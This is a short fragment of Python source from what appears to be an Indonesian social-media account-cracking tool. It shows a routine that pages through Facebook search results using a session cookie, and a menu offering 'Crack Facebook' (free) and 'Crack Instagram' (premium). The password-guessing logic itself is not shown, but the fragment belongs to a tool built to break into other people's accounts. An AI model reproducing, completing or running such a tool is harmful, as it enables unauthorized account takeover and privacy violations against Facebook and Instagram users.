               if 'Lihat Hasil Selanjutnya' in r.text:
                   self.SearchName(r.get('href'),coki)
       except:pass

   def ToolsType(self):
       exit(Bdt_old.MAIN().List(self.pk_idg))

def ListTools():
    try:MAIN().bersih(platform.system())
    except:pass
    MAIN().Me()
    print(f'{P}[{H}1{P}] Crack Facebook  : {K2}Free{P}')
    print(f'[{H}2{P}] Crack Instagram : {H}Prem{P}')
    print(f'[{K}0{P}] Exit\n')
    while True:
      x = input(f'[{H}?{P}] Pilih : ')
      if x in   ['01','1']:MAIN().Menu()
      elif x in ['02','2']:MAIN().insta()
      elif x in ['00','0']:exit()

'''
	Janji Gak Copy Paste Wkwk
'''
